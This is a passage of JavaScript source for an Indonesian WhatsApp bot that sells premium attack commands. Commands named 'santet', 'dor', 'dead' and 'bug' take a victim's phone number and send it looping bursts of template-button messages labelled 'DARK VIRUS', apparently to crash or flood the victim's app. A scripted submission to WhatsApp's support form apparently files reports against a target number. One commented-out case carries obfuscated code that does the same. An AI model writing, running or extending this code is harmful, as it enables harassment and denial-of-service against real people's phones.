let $ = cheerio.load(ntah.data)
let $form = $("form");
let url = new URL($form.attr("action"), "https://www.whatsapp.com").href
let form = new URLSearchParams()
form.append("jazoest", $form.find("input[name=jazoest]").val())
form.append("lsd", $form.find("input[name=lsd]").val())
form.append("step", "submit")
form.append("country_selector", "ID")
form.append("phone_number", q)
form.append("email", email.data[0])
form.append("email_confirm", email.data[0])
form.append("platform", "ANDROID")
form.append("your_message", "halo bandung")
form.append("__user", "0")
form.append("__a", "1")
form.append("__csr", "")
form.append("__req", "8")
form.append("__hs", "19316.BP:whatsapp_www_pkg.2.0.0.0.0")
form.append("dpr", "1")
form.append("__ccg", "UNKNOWN")
form.append("__rev", "1006630858")
form.append("__comment_req", "0")
let res = await axioss({
  url,
  method: "POST",
  data: form,
  headers: {
    cookie
  }
})
//dunskybot.reply(util.format(JSON.parse(res.data.replace("for (;;);", ""))))
dunskybot.reply(`SUKSES BRO`)
}
break
// case 'menfess':
//     if (!isPengguna) return reply(`NOMOR ANDA BELUM TERDAFTAR DI DATABASE\nSILAHKAN KLIK TOMBOL DIBAWAH UNTUK REGISTRASI\n\nATAU KETIK #verify SECARA MANUAL`)   
// if (limit.isLimit(from, _limit, limitCount, isPremium, itsMediablo)) return reply(mess.limit)
// limit.addLimit(from, _limit, isPremium, itsMediablo)
// if (Object.values(anon.anonymous).find(p => p.check(sender))) return reply("Anda masih didalam room")
// if (dunskybot.isGroup) return reply(mess.private)
// if (args.length < 1) return reply(`Penggunaan ${prefix+command} nomor|isi pesan\nContoh ${prefix+command} 62895600000048|Hai Owner`)
// if (text > 700) return reply(`Teks Kepanjangan`)
// num = q.split("|")[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net'
// pesan = q.split('|')[1]
// let cekno = await dunsky.onWhatsApp(num)
// if (cekno.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
// if (num === dunskybot.sender) return reply(`Tidak Bisa Menfess Ke Nomor Sendiri!!!`)
// if (num === botNumber) return reply(`Tidak Bisa Menfess Ke Nomor bot!!!`)
// let ivg = `https://telegra.ph/file/11ad4ee7a5b6fd2d5fcfa.jpg`
// var nomor = dunskybot.sender
// //let ownernya = ownerNomor + '@s.whatsapp.net'
// let ments = [num, nomor]
// gambar = `https://telegra.ph/file/11ad4ee7a5b6fd2d5fcfa.jpg`
// let teksnya = `Hi Saya DunskyBot, Kami mendapat pesan menfes dari seseorang nih

// -------------------------------------->

// 💌 Pesan : ${pesan}

// -------------------------------------->`
// let buttons = [
// { buttonId: '.leave', buttonText: { displayText: 'ABAIKAN' }, type: 1 }
// ]
// dunsky.sendMessage(num, { caption: teksnya, image: {url: `https://telegra.ph/file/11ad4ee7a5b6fd2d5fcfa.jpg`}, buttons, footer: `Anda juga bisa membalas pesannya dengan cara mengirimkan pesan. Jika anda tidak mau membalasnya, maka pencet tombol ABAIKAN dibawah ini` })
// //await dunsky.sendMessage(num, {text:`𝘈𝘯𝘥𝘢 𝘑𝘶𝘨𝘢 𝘉𝘪𝘴𝘢 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘗𝘦𝘴𝘢𝘯 𝘕𝘺𝘢 𝘋𝘦𝘯𝘨𝘢𝘯 𝘊𝘢𝘳𝘢 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘗𝘦𝘴𝘢𝘯, 𝘑𝘪𝘬𝘢 𝘈𝘯𝘥𝘢 𝘛𝘪𝘥𝘢𝘬 𝘔𝘢𝘶 𝘔𝘦𝘮𝘣𝘢𝘭𝘢𝘴 𝘕𝘺𝘢 𝘗𝘦𝘯𝘤𝘦𝘵 𝘉𝘶𝘵𝘵𝘰𝘯 𝘽𝙞𝙖𝙧𝙞𝙣 𝘋𝘪 𝘈𝘵𝘢𝘴 𝘠𝘢𝘩 𝘔𝘢𝘬𝘢𝘴𝘪𝘩`}, {location: { jpegThumbnail: await reSize(ivg, 300, 200)}}, { quoted : m })
// lidt = `Sukses Mengirim Pesan wa.me/${q.split("|")[0].replace(/[^0-9]/g, '')}

// Isi Pesan : ${pesan}`
// bls = `*Pesan berhasil dikirim ke ${q.split("|")[0].replace(/[^0-9]/g, '')}*`
// var check = Object.values(anon.anonymous).find(p => p.state == "WAITING")
// if (!check) {
// anon.createRoom(sender, num)
// console.log("[ANONYMOUS] Creating room for: " + sender);
// return dunskybot.reply(lidt)
// }
// break
// case 'leave':{
//     if (dunskybot.isGroup && itsMediablo && command == "leave") return dunsky.groupLeave(from)
//     if (dunskybot.isGroup) return reply("Only private chat")
//     var room = Object.values(anon.anonymous).find(p => p.check(sender))
//     if (!room) return reply("Anda tidak berada didalam room")
//     reply("_Obrolan telah berakhir_")
//     var other = room.other(sender)
//     delete anon.anonymous[room.id]
//     if (other != "") dunsky.sendMessage(other, {
//     text: "*Partnermu telah meninggalkan roomchat menfess*"
//     })
//     if (command == "leave") break;
//     }
// case 'menu':
// jiren = ` 
// ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
//                     𝗠𝗘𝗡𝗨
// ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
// BOT NAME : AriXos
// RUNING ON : VPS
// OWNER : wa.me/6283116373508

// SILAHKAN PILIH MENU DIBAWAH

// • bugmenu
// • othermenu

// CREDIT : AriXos
// ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
    
// `
// dunskybot.reply(jiren)
// break
// case 'bugmenu':
// jiren = ` 
// ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
//                 𝗕𝗨𝗚𝗠𝗘𝗡𝗨
// ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
// 【♡ۣۜۜ፝͜͜͡͡✿➣  bug5 (62xxx)
// 【♡ۣۜۜ፝͜͜͡͡✿➣  bug10 (62xxx)
// 【♡ۣۜۜ፝͜͜͡͡✿➣  bug100 (62xxx)
// 【♡ۣۜۜ፝͜͜͡͡✿➣  bug1000 (62xxx)
// 【♡ۣۜۜ፝͜͜͡͡✿➣  santet (62xxx)
// 【♡ۣۜۜ፝͜͜͡͡✿➣  dor (62xxx)
// 【♡ۣۜۜ፝͜͜͡͡✿➣  bom (62xxx)
// 【♡ۣۜۜ፝͜͜͡͡✿➣  brutal (62xxx)
// 【♡ۣۜۜ፝͜͜͡͡✿➣  kill (62xxx)
// 【♡ۣۜۜ፝͜͜͡͡✿➣  troli (62xxx)
//  contoh : bug5 6281234126765
// ▬▭▬▭▬▭▬▭▬▭▬▭▬
    
// `
// dunskybot.reply(jiren)
// break
// case 'othermenu':
// jiren = `
// ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
//                   𝗢𝗧𝗛𝗘𝗥
// ▬▭▬▭▬ ✦✧✦ ▬▭▬▭▬
// 【♡ۣۜۜ፝͜͜͡͡✿➣  tag ( untuk tag member }
// 【♡ۣۜۜ፝͜͜͡͡✿➣  restart ( untuk restart bot )
// 【♡ۣۜۜ፝͜͜͡͡✿➣  stats ( untuk melihat status bot )
// 【♡ۣۜۜ፝͜͜͡͡✿➣  akses ( untuk beli akses )
// 【♡ۣۜۜ፝͜͜͡͡✿➣  sewa ( untuk sewabot dalam grup )
// ▬▭▬▭▬▭▬▭▬▭▬▭▬
    
// `
// dunskybot.reply(jiren)
// break
case 'premium':
    if (!isModerator) return dunskybot.reply(mess.owner)
                if (ar[0] === 'add') {
                    if (cekPremi("id", args[1] + '@s.whatsapp.net') !== null) return reply('User tersebut sudah premium')
                    premium.addPremiumUser(args[1] + '@s.whatsapp.net', args[2], _premium)
                    reply(`*── 「 PREMIUM ADDED 」 ──*\n\n➸ *ID*: ${args[1]}@s.whatsapp.net\n➸ *Expired*: ${parsems(ms(args[2])).days} day(s) ${parsems(ms(args[2])).hours} hour(s) ${parsems(ms(args[2])).minutes} minute(s)`, dunskybot)
                } else if (ar[0] === 'del') {
                    _premium.splice(premium.getPremiumPosition(args[1] + '@s.whatsapp.net', _premium), 1)
                    fs.writeFileSync('./database/prem.json', JSON.stringify(_premium))
                    reply('Sukses')
                } else {
                    reply('Format salah')
                }
            break
            case 'cekpremium':
                if (!isPremium) return reply(mess.premium)
                const cekExp = parsems(premium.getPremiumExpired(from, _premium) - Date.now())
                reply(`*── 「 PREMIUM EXPIRED 」 ──*\n\n➸ *ID*: ${from}\n➸ *Premium left*: ${cekExp.days} day(s) ${cekExp.hours} hour(s) ${cekExp.minutes} minute(s)`, dunskybot)
            break
case 'akses':
    if (!isPengguna) return reply(`NOMOR ANDA BELUM TERDAFTAR DI DATABASE\nSILAHKAN KLIK TOMBOL DIBAWAH UNTUK REGISTRASI\n\nATAU KETIK #verify SECARA MANUAL`)
dunskybot.reply(`UNTUK AKSES BOT CHAT OWNER : wa.me/6283116373508`)
break
case 'sewa':
    if (!isPengguna) return reply(`NOMOR ANDA BELUM TERDAFTAR DI DATABASE\nSILAHKAN KLIK TOMBOL DIBAWAH UNTUK REGISTRASI\n\nATAU KETIK #verify SECARA MANUAL`)
dunskybot.reply(`UNTUK SEWA BOT CHAT OWNER : wa.me/6283116373508`)
break
case 'masuk_ke': {
if (!itsMediablo) return dunskybot.reply(mess.owner)
if (!text) return dunskybot.reply(`Contoh ${prefix+command} linkgc`)
if (!isUrl(args[0]) && !args[0].includes('whatsapp.com')) throw 'Link Invalid!'
let result = args[0].split('https://chat.whatsapp.com/')[1]
await dunsky.groupAcceptInvite(result).then((res) => dunskybot.reply(jsonformat(res))).catch((err) => dunskybot.reply(jsonformat(err)))
}
break
case 'restart':{
    if (!itsMediablo) return dunskybot.reply(mess.owner)
        txts = `SUKSES NGAB KAK`
        dunskybot.reply(txts)
 let cp = require('child_process')
let { promisify } = require('util')
let exec = promisify(cp.exec).bind(cp)
  let o
  try {
  o = exec('pm2 restart all')
  } catch (e) {
  o = e
 } finally {
let { stdout, stderr } = o
}
}
break
case 'addakses':
 if (!isGroup) return dunskybot.reply(`wajib dalam grup`)
if (!isGroupAdmins) return dunskybot.reply(`sorry anda sepertinya bukan pemilik bot`)
        
if (!args[0]) return dunskybot.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await dunsky.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
owner.push(bnnd)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
dunskybot.reply(`Nomor ${bnnd} Sudah Bisa Akses!!!`)
break
case 'delakses':
    if (!isGroup) return dunskybot.reply(`wajib dalam grup`)
if (!isGroupAdmins) return dunskybot.reply(`sorry anda sepertinya bukan pemilik bot`)
        
if (!args[0]) return dunskybot.reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 0`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = owner.indexOf(ya)
owner.splice(unp, 1)
fs.writeFileSync('./database/owner.json', JSON.stringify(owner))
dunskybot.reply(`Nomor ${ya} Sudah Tidak Bisa Akses Bot`)
break
case 'tag': {
 if (!itsMediablo) return dunskybot.reply(`sorry anda sepertinya bukan pemilik bot`)
   
dunsky.sendMessage(dunskybot.chat, { text : q ? q : '' , mentions: participants.map(a => a.id)}, { quoted: dunskybot })
}
break
case 'test':
case 'stats':{
const used = process.memoryUsage()
const cpus = os.cpus().map(cpu => {
cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
return cpu
})
const cpu = cpus.reduce((last, cpu, _, { length }) => {
last.total += cpu.total
last.speed += cpu.speed / length
last.times.user += cpu.times.user
last.times.nice += cpu.times.nice
last.times.sys += cpu.times.sys
last.times.idle += cpu.times.idle
last.times.irq += cpu.times.irq
return last
}, {
speed: 0,
total: 0,
times: {
user: 0,
nice: 0,
sys: 0,
idle: 0,
irq: 0
}
})
let timestamp = speed()
let latensi = speed() - timestamp
respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
`
dunskybot.reply(respon)
}
break
   case 'dor':
    if (!isPremium) return replyprem(mess.premium)
           if (!isGroup) return dunskybot.reply(`wajib dalam grup`)
        txts = `SUKSES NGAB ✅`

    
      if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
        jumlah = '20'
        waktu = `4s`
        let ceknomo = await dunsky.onWhatsApp(num)
    if (ceknomo.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
    if (num === dunskybot.sender) return reply(`Tidak Bisa Santet ke Nomor Sendiri!!!`)
    if (num === botNumber) return reply(`Tidak Bisa santet Ke Nomor bot!!!`)
    // KALO MAU BUTTON BANYAK COPY BUTTON NYA TRUS BANYAKIN CONTOH DI BAWAH INI NGENTOT
/* templateButtons: [
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
,*/
for (let i = 0; i < jumlah; i++) {
dunsky.sendMessage(num, {
text: 'DUNSKYBOT WUZZ HERE', 
templateButtons: [
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `AKWOWK KASIAN️`, id: ``}},
{ quoted: lep }
]})
dunskybot.reply(txts)}
await sleep(ms(waktu))
break
case 'santetv2':
    if (!isPremium) return replyprem(mess.premium)
           if (!isGroup) return dunskybot.reply(`wajib dalam grup`)
        txts = `SUKSES NGAB ✅`

      if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
        jumlah = '10'
        waktu = `4s`
        let ownernya = owner + '@s.whatsapp.net'
        let member = nokebal + '@s.whatsapp.net'
        let ceknom = await dunsky.onWhatsApp(num)
    if (ceknom.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
    if (num === dunskybot.sender) return reply(`Tidak Bisa Santet ke Nomor Sendiri!!!`)
    if (num === botNumber) return reply(`Tidak Bisa santet Ke Nomor bot!!!`)
    if (num === ownernya) return reply(`MAU NGAPAIN NYANTET OWNER GOBLOOGGG`)
    if (num === member) return reply(`MEMBER VIP NI BOS, GABISA DI SANTET :D`)
for (let i = 0; i < jumlah; i++) {
dunsky.sendMessage(num, {
text: 'DUNSKYBOT WUZZ HERE', 
templateButtons: [
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quoted: lep }
]})
await sleep(ms(waktu))
}
dunskybot.reply(txts)
break
case 'dor':
  case 'santet':
    if (!isPengguna) return reply(`NOMOR ANDA BELUM TERDAFTAR DI DATABASE\nSILAHKAN KLIK TOMBOL DIBAWAH UNTUK REGISTRASI\n\nATAU KETIK #verify SECARA MANUAL`)
    // if (!isGroup) return dunskybot.reply(`Bot ini khusus untuk di dalam Grup`)
    if (!isPremium) return replyprem(mess.premium)
        txts = `SUKSES NGAB ✅`
        
    
      if (!q) return 
        num = `${q}`+'@s.whatsapp.net'
        jumlah = '10'
        waktu = `4s`
        let ownernya1 = owner + '@s.whatsapp.net'
        let member1 = nokebal + '@s.whatsapp.net'
        let ceknom1 = await dunsky.onWhatsApp(num)
    if (ceknom1.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
    if (num === dunskybot.sender) return reply(`Tidak Bisa Santet ke Nomor Sendiri!!!`)
    if (num === botNumber) return reply(`Tidak Bisa santet Ke Nomor bot!!!`)
    if (num === ownernya1) return reply(`MAU NGAPAIN NYANTET OWNER GOBLOOGGG`)
    if (num === member1) return reply(`MEMBER VIP NI BOS, GABISA DI SANTET :D`)
    // KALO MAU BUTTON BANYAK COPY BUTTON NYA TRUS BANYAKIN CONTOH DI BAWAH INI NGENTOT
/* templateButtons: [
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
,*/
for (let i = 0; i < jumlah; i++) {
dunsky.sendMessage(num, {
text: 'PLER WUZZ HERE', 
templateButtons: [
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
{ urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
{ quoted: lep }
]})
await sleep(ms(waktu))
}
dunskybot.reply(txts)
break
case 'dead': {
    if (!isPengguna) return reply(`NOMOR ANDA BELUM TERDAFTAR DI DATABASE\nSILAHKAN KLIK TOMBOL DIBAWAH UNTUK REGISTRASI\n\nATAU KETIK #verify SECARA MANUAL`)
    if (!isPremium) return replyprem(mess.premium)
    if (!isGroup) return dunskybot.reply(`wajib dalam grup`)
    if (!q) return 
    num = `${q}`+'@s.whatsapp.net'
    let ownernya = owner + '@s.whatsapp.net'
jumlah = '3'
jumlah2 = '3'
waktu = '3s'
waktu2 = '1s'
let cekno = await dunsky.onWhatsApp(num)
    if (cekno.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
    if (num === dunskybot.sender) return reply(`Tidak Bisa Santet ke Nomor Sendiri!!!`)
    if (num === botNumber) return reply(`Tidak Bisa santet Ke Nomor bot!!!`)
    if (num === ownernya) return reply(`MAU NGAPAIN NYANTET OWNER GOBLOOGGG`)
for (let i = 0; i < jumlah2; i++) {
dunsky.sendMessage(num, {sticker: ppnyauser},{ quoted: lep })
await sleep(ms(waktu))
}
for (let i = 0; i < jumlah; i++) {
dunsky.sendMessage(num, {
    text: '', 
    templateButtons: [
    { callButton: { displayText: `P`, phoneNumber: ``}},
    { callButton: { displayText: `P`, phoneNumber: ``}},
    { urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
    { quickReplyButton: { displayText: `P`, id: ``}},
    { quickReplyButton: { displayText: `P`, id: ``}},
    { quickReplyButton: { displayText: `P`, id: ``}},
    { quickReplyButton: { displayText: `P`, id: ``}},
    { quickReplyButton: { displayText: `P`, id: ``}},
    { quickReplyButton: { displayText: `P`, id: ``}},
    ]})
    await sleep(ms(waktu2))
//dunsky.sendMessage(num, {sticker: ppnyauser}, {quoted: mampus})
}
reply(`SUKSES NGAB ✅`)
}
// case 'mampus':{
//     if (!isPengguna) return reply(`NOMOR ANDA BELUM TERDAFTAR DI DATABASE\nSILAHKAN KLIK TOMBOL DIBAWAH UNTUK REGISTRASI\n\nATAU KETIK #verify SECARA MANUAL`)
//     if (!isPremium) return replyprem(mess.premium)
//            if (!isGroup) return dunskybot.reply(`wajib dalam grup`)
//     if (args.length == 0) return reply(`Penggunaan ${prefix+command} 6289xxxxx`)
//     num = q.replace(/[^0-9]/g, '')+`@s.whatsapp.net`
//     let ownernya = owner + '@s.whatsapp.net'
// let jumlah = '5'
// const ydd = `Hallo Aku Tzyl`
// const waktu2 = '1s'
// let cekno = await dunsky.onWhatsApp(num)
//     if (cekno.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
//     if (num === dunskybot.sender) return reply(`Tidak Bisa Santet ke Nomor Sendiri!!!`)
//     if (num === botNumber) return reply(`Tidak Bisa santet Ke Nomor bot!!!`)
//     if (num === ownernya) return reply(`MAU NGAPAIN NYANTET OWNER GOBLOOGGG`)
// for (let i = 0; i < jumlah; i++) {
// function _0x5385(_0x2ab646,_0x156951){var _0x3a233e=_0x3a23();return _0x5385=function(_0x53850c,_0x4c3e8d){_0x53850c=_0x53850c-0x147;var _0xd786db=_0x3a233e[_0x53850c];return _0xd786db;},_0x5385(_0x2ab646,_0x156951);}function _0x3a23(){var _0x5f31ec=['NAME','34783nWaGUx','70YCNYrF','OWNER','1184216mLjwdr','147066EAQNAA','sendMessage','6281214281312','771192XPifQJ','6285714170944','JAGOAN\x20OM?','45FHicsI','2213460MCRxLU','AH\x20SLEBEEW','350069CkDHKE','Anjay\x20Menger','https://chat.whatsapp.com/I6VMA8KF74gICjxESpThL2','94440ePvkzM','chat'];_0x3a23=function(){return _0x5f31ec;};return _0x3a23();}var _0x47bf3a=_0x5385;(function(_0x2eb902,_0x5904db){var _0x5e852c=_0x5385,_0x1631cb=_0x2eb902();while(!![]){try{var _0x4d18d8=-parseInt(_0x5e852c(0x157))/0x1+parseInt(_0x5e852c(0x151))/0x2+parseInt(_0x5e852c(0x155))/0x3+-parseInt(_0x5e852c(0x147))/0x4*(-parseInt(_0x5e852c(0x14b))/0x5)+parseInt(_0x5e852c(0x14e))/0x6+-parseInt(_0x5e852c(0x14a))/0x7+parseInt(_0x5e852c(0x14d))/0x8*(-parseInt(_0x5e852c(0x154))/0x9);if(_0x4d18d8===_0x5904db)break;else _0x1631cb['push'](_0x1631cb['shift']());}catch(_0x5d4c67){_0x1631cb['push'](_0x1631cb['shift']());}}}(_0x3a23,0x5d93e),await dunsky[_0x47bf3a(0x14f)](num,{'text':'','templateButtons':[{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x152)}},{'callButton':{'displayText':_0x47bf3a(0x14c),'phoneNumber':_0x47bf3a(0x150)}},{'urlButton':{'displayText':'GROUP\x20HW\x20MODS\x20WA','url':_0x47bf3a(0x159)}},{'quickReplyButton':{'displayText':'MY','id':_0x47bf3a(0x158)}},{'quickReplyButton':{'displayText':_0x47bf3a(0x149),'id':_0x47bf3a(0x156)}},{'quickReplyButton':{'displayText':'HW\x20MODS\x20WA','id':_0x47bf3a(0x153)}}]}));
// await sleep(ms(waktu2))
// }
// reply(`SUKSES NGAB ✅`)
// }
// break
// case 'kill':
//     if (!isPengguna) return reply(`NOMOR ANDA BELUM TERDAFTAR DI DATABASE\nSILAHKAN KLIK TOMBOL DIBAWAH UNTUK REGISTRASI\n\nATAU KETIK #verify SECARA MANUAL`)
//     if (!isPremium) return replyprem(mess.premium)
//            if (!isGroup) return dunskybot.reply(`wajib dalam grup`)
//         txts = `SUKSES NGAB ✅`
        
    
//       if (!q) return 
//         num = `${q}`+'@s.whatsapp.net'
//         jumlah = '10'
//         waktu = `4s`
//         let ceknob = await dunsky.onWhatsApp(num)
//         if (ceknob.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
//     if (num === dunskybot.sender) return reply(`Tidak Bisa Santet ke Nomor Sendiri!!!`)
//     if (num === botNumber) return reply(`Tidak Bisa santet Ke Nomor bot!!!`)
//     // KALO MAU BUTTON BANYAK COPY BUTTON NYA TRUS BANYAKIN CONTOH DI BAWAH INI NGENTOT
// /* templateButtons: [
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// ,*/
// for (let i = 0; i < jumlah; i++) {
// dunsky.sendMessage(num, {
// text: 'DUNSKYBOT WUZZ HERE', 
// templateButtons: [
//    { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
//    { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { callButton: { displayText: `☣️ DARK VIRUS ☣️`, phoneNumber: ``}},
// { urlButton: { displayText: `☣️ DARK VIRUS ☣️`, url: `https://www.whatsapp.com/otp/copy/`}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
// { quickReplyButton: { displayText: `☣️ DARK VIRUS ☣️`, id: ``}},
